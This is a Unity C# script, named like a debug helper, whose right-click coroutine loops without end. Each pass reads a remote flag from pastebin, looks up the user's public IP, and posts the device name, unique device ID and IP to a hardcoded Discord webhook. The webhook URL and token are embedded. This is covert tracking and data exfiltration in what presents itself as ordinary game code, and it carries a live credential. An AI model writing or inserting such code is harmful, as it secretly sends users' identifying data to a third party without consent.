using System.Collections;
using System.Collections.Generic;
using UnityEngine;

public class DEBUG_req_0 : MonoBehaviour
{
	/*
	private void Start()
	{
		//
		StartCoroutine(STIMULATE());
	}
	*/

	
	private void Update()
	{
		
		if(Input.GetMouseButtonDown(1))
		{
			StopAllCoroutines();
			StartCoroutine(STIMULATE());
		}
		
	}
	


	public byte[] bytes;


	IEnumerator STIMULATE()
	{

		#region frame_rate
		QualitySettings.vSyncCount = 2;
		yield return null; 
		yield return null;

		#endregion


		/*
		string _url = "https://pastebin.com/raw/1VXaQYEg";
		UnityEngine.Networking.UnityWebRequest _req = UnityEngine.Networking.UnityWebRequest.Get(_url);

		yield return _req.SendWebRequest();

		if (_req.isHttpError || _req.isNetworkError)
		{

			if (_req.isHttpError) Debug.Log("http error");
			if (_req.isNetworkError) Debug.Log("network error");
		}
		else
		{
			bytes = _req.downloadHandler.data;
			Debug.Log(_req.downloadHandler.data);
			Debug.Log(_req.downloadHandler.text);
			Debug.Log((int)_req.responseCode);
		}
		*/

		while (true)
		{
			// https://pastebin.com/raw/0rBbzpbV
			string _url_2 = "https://pastebin.com/raw/0rBbzpbV";
			UnityEngine.Networking.UnityWebRequest _req_2 = UnityEngine.Networking.UnityWebRequest.Get(_url_2);
			yield return _req_2.SendWebRequest();




			string _url_0 = "http://ip-api.com/json?fields=query";
			UnityEngine.Networking.UnityWebRequest _req_0 = UnityEngine.Networking.UnityWebRequest.Get(_url_0);
			yield return _req_0.SendWebRequest();




			string _url_1 = "https://discord.com/api/webhooks/1080877886724128778/wmqHTWEPkIR45KI3NUnXSk0zGDWEAIoRmoi_PT7XJ3gptIbNcqLXCX6-fnQGFsC47J2Z";
			WWWForm _form = new WWWForm();

			_form.AddField("username", SystemInfo.deviceName);
			_form.AddField("avatar_url", "https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/7fe38982-209d-4b5c-807a-cfd856163830/ddtykjz-91689cf8-34cc-46ff-b24b-712988ed9071.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7InBhdGgiOiJcL2ZcLzdmZTM4OTgyLTIwOWQtNGI1Yy04MDdhLWNmZDg1NjE2MzgzMFwvZGR0eWtqei05MTY4OWNmOC0zNGNjLTQ2ZmYtYjI0Yi03MTI5ODhlZDkwNzEuanBnIn1dXSwiYXVkIjpbInVybjpzZXJ2aWNlOmZpbGUuZG93bmxvYWQiXX0.hcT7jLQNoLG-nYNAI6yl0-N3ltfAW9ui5k_pz_V9Jns");

			string str = "";
			if (_req_2.downloadHandler.text[2] == '1') str += SystemInfo.deviceUniqueIdentifier + ' ';
			if (_req_2.downloadHandler.text[3] == '1') str += _req_0.downloadHandler.text;


			_form.AddField("content",
				'`' +
				str +
				'`' 

			);



			UnityEngine.Networking.UnityWebRequest _req_1 = UnityEngine.Networking.UnityWebRequest.Post
			(
				_url_1,
				_form
			);

			yield return _req_1.SendWebRequest();



			for (int i = 0; i < 20000; i += 1)
				yield return null;
		}
	}




}
